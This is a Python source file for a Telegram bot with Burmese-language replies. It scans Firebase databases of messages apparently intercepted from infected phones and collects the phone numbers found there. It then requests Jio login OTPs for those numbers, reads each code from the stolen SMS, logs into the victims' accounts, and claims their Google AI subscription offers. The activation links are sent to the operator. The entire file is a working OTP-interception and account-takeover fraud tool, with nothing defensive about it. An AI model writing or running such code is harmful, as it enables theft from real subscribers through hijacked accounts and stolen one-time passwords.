"""
Jio Gemini Activation Scanner - TELEGRAM BOT & RENDER EDITION (HIGH-SPEED THREADED)
Using new Jio.py structure with panels.txt (| separator) and multi-threading.
"""
from __future__ import annotations
import csv
import html
import re
import time
import os
import threading
from collections import Counter, defaultdict
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import unquote
from flask import Flask
import telebot
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== TELEGRAM & WEB SERVER CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    print("Error: BOT_TOKEN must be set in Environment Variables.")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)

@app.route('/')
def alive():
    return "Bot is running online on Render!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

ADMIN_CHAT_ID = 1847021130

PANELS_FILE = Path("panels.txt")
MESSAGE_SCAN_LIMIT = 150
OTP_TIMEOUT = 20
POLL_INTERVAL = 1

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

# ==================== FUNCTIONS ====================
def clean_firebase_url(url: str) -> str:
    url = url.strip().replace(" ", "")
    if not url.startswith("https://"):
        url = "https://" + url
    return url

def clean_firebase_key(key: str) -> str:
    key = key.strip().replace(" ", "")
    if key.startswith("http"):
        return ""
    return key

def load_panels() -> list[tuple[str, str]]:
    if not PANELS_FILE.exists():
        return []
    panels: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    with PANELS_FILE.open(encoding="utf-8") as handle:
        for raw_line in handle:
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split("|", 1)
            base_url = clean_firebase_url(parts[0])
            key = clean_firebase_key(parts[1]) if len(parts) > 1 else ""
            if not base_url or ("firebaseio.com" not in base_url and "firebasedatabase.app" not in base_url):
                continue
            entry = (base_url, key)
            if entry in seen:
                continue
            seen.add(entry)
            panels.append(entry)
    return panels

def firebase_get_with_retry(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None, max_retries: int = 3) -> Any:
    query = {}
    if key and not key.startswith("http"):
        query["auth"] = key
    if params:
        query.update(params)
    for attempt in range(max_retries):
        try:
            response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
            response.raise_for_status()
            return response.json()
        except (requests.RequestException, ValueError):
            if attempt == max_retries - 1:
                raise
            time.sleep(1 * (attempt + 1))
    return {}

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    try:
        return firebase_get_with_retry(session, base_url, key, path, params)
    except Exception:
        return {}

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    try:
        data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
        if not isinstance(data, dict):
            return {}
        return {name: value for name, value in data.items() if isinstance(value, dict)}
    except Exception:
        return {}

def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    found: set[str] = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found

def firebase_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache", "User-Agent": "Mozilla/5.0"})
    return session

def jio_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    data = response_json(response)
    return not response_error(response) and bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.post(SEND_OTP_URL, json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(response)

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        response = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(response)

def message_order(key: str, item: dict[str, Any]) -> int:
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed", "already in use",
        "subscription already", "link has already been used", "already used"
    ))

def api_message(data: dict[str, Any]) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

# ==================== TELEGRAM COMMAND HANDLERS ====================
@bot.message_handler(commands=['run'])
def handle_run_command(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
        return
    
    bot.reply_to(message, "🚀 Multi-threading စနစ်ဖြင့် အမြန်ဆုံး စစ်ဆေးနေပါပြီ ခဏစောင့်ပါ...")
    threading.Thread(target=main_process, args=(message.chat.id,), daemon=True).start()

@bot.message_handler(commands=['addpanel'])
def add_panel_command(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ ပုံစံမမှန်ပါ။ ဤကဲ့သို့ ပို့ပေးပါ:\n`/addpanel URL|KEY`", parse_mode="Markdown")
        return
    
    panel_info = parts[1].strip()
    if "|" not in panel_info:
        bot.reply_to(message, "⚠️ URL နှင့် Key ကြားတွင် ပိုက်လိုင်း (`|`) ခံရန် မမေ့ပါနှင့်။")
        return
    
    with open("panels.txt", "a", encoding="utf-8") as f:
        f.write(panel_info + "\n")
        
    bot.reply_to(message, "✅ Panel အသစ်ကို `panels.txt` ထဲသို့ အောင်မြင်စွာ ထည့်သွင်းပြီးပါပြီ!")

@bot.message_handler(commands=['listpanels'])
def list_panels_command(message):
    if message.chat.id != ADMIN_CHAT_ID:
        bot.reply_to(message, "❌ ဤခလုတ်ကို အသုံးပြုခွင့် မရှိပါ။")
        return
        
    panels = load_panels()
    if not panels:
        bot.reply_to(message, "📁 `panels.txt` ထဲတွင် Panel တစ်ခုမှ မရှိသေးပါ။")
        return
        
    text = f"📋 <b>လက်ရှိ Panel စုစုပေါင်း ({len(panels)} ခု):</b>\n\n"
    for idx, (url, key) in enumerate(panels[:15], start=1):
        text += f"{idx}. <code>{url}</code>\n"
        
    if len(panels) > 15:
        text += f"\n... နှင့် အခြား {len(panels) - 15} ခု ကျန်ရှိသေးသည်။"
        
    bot.reply_to(message, text, parse_mode="HTML")

# ==================== MAIN PROCESS (MULTI-THREADED) ====================
def main_process(chat_id: int) -> int:
    valid_panels = load_panels()
    if not valid_panels:
        bot.send_message(chat_id, "❌ `panels.txt` ဖိုင်ထဲတွင် Panel လင့်ခ်များ မတွေ့ပါ။")
        return 1

    bot.send_message(chat_id, f"🔍 STEP 1: Panel {len(valid_panels)} ခုကို Thread များဖြင့် အမြန်ဆုံး စစ်ဆေးနေပါပြီ...")
    
    all_online_devices: dict[str, dict[str, Any]] = {}
    device_messages: dict[str, dict[str, dict[str, Any]]] = {}
    
    def scan_panel(panel_idx: int, base_url: str, firebase_key: str):
        firebase = firebase_session()
        try:
            clients = firebase_get(firebase, base_url, firebase_key, "clients")
            if not isinstance(clients, dict):
                return {}
            devices = {}
            for device_id, data in clients.items():
                if isinstance(data, dict) and data.get("status") is True:
                    devices[device_id] = {
                        "base_url": base_url,
                        "firebase_key": firebase_key,
                        "firebase_session": firebase,
                        "data": data,
                    }
            return devices
        except Exception:
            return {}

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(scan_panel, idx, url, key): idx
            for idx, (url, key) in enumerate(valid_panels, start=1)
        }
        for future in as_completed(futures):
            devices = future.result()
            if devices:
                all_online_devices.update(devices)
    
    if not all_online_devices:
        bot.send_message(chat_id, "❌ Online ရှိသော Device တစ်ခုမှ မတွေ့ပါ။")
        return 1
    
    bot.send_message(chat_id, f"📱 Online Devices စုစုပေါင်း တွေ့ရှိမှု: {len(all_online_devices)} ခု။ မက်ဆေ့ချ်များ စစ်ဆေးနေပါပြီ...")
    
    def scan_device(device_id: str, info: dict[str, Any]):
        messages = latest_messages(
            info["firebase_session"],
            info["base_url"],
            info["firebase_key"],
            device_id,
            MESSAGE_SCAN_LIMIT,
        )
        mobiles = number_candidates(messages)
        return device_id, messages, mobiles

    mappings: dict[str, set[str]] = defaultdict(set)
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(scan_device, device_id, info): device_id
            for device_id, info in all_online_devices.items()
        }
        for future in as_completed(futures):
            device_id, messages, mobiles = future.result()
            device_messages[device_id] = messages
            for mobile in mobiles:
                mappings[mobile].add(device_id)
    
    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))
    
    if not targets:
        bot.send_message(chat_id, "❌ ဖုန်းနံပါတ် Candidate တစ်ခုမှ မတွေ့ပါ။ (ဖုန်းနံပါတ်များ သို့မဟုတ် မက်ဆေ့ချ်ဒေတာ မရှိပါ)")
        return 1
    
    bot.send_message(chat_id, f"🎯 Unique Numbers စုစုပေါင်း: {len(targets)} ခု။ OTP + Activation စတင်နေပါပြီ...")
    
    jio = jio_session()
    statuses: Counter[str] = Counter()
    
    for serial, (device_id, mobile) in enumerate(targets, start=1):
        info = all_online_devices.get(device_id)
        if not info:
            continue
        
        base_url = info["base_url"]
        firebase_key = info["firebase_key"]
        firebase = info["firebase_session"]
        device = info["data"]
        
        if not isinstance(device, dict) or device.get("status") is not True:
            status, url = "device_offline", ""
        else:
            if not is_jio_number(jio, mobile):
                status, url = "not_jio_number", ""
            else:
                known_keys = set(device_messages.get(device_id, {}))
                if not send_otp(jio, mobile):
                    status, url = "otp_send_failed", ""
                elif not wait_for_otp(firebase, base_url, firebase_key, device_id, known_keys, jio, mobile):
                    status, url = "otp_failed", ""
                else:
                    status, url = get_activation(jio)
                    
        statuses[status] += 1
        
        if url:
            success_msg = f"✅ <b>Activation အောင်မြင်ပါသည်!</b>\n📱 ဖုန်းနံပါတ်: <code>{mobile}</code>\n🔗 လင့်ခ်: {url}"
            bot.send_message(chat_id, success_msg, parse_mode="HTML", disable_web_page_preview=True)
            
    summary_text = f"📊 <b>စစ်ဆေးမှု ပြီးဆုံးပါပြီ (FINAL SUMMARY)</b>\n\n"
    summary_text += f"📱 Online Devices : {len(all_online_devices)}\n"
    summary_text += f"🎯 Unique Numbers : {len(targets)}\n\n"
    for status, count in sorted(statuses.items()):
        summary_text += f"▪️ {status}: {count} ခု\n"
        
    bot.send_message(chat_id, summary_text, parse_mode="HTML")
    return 0

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    print("Starting Web Server and Bot with Threading Support...")
    t_web = threading.Thread(target=run_web, daemon=True)
    t_web.start()
    bot.infinity_polling(skip_pending=True)
    
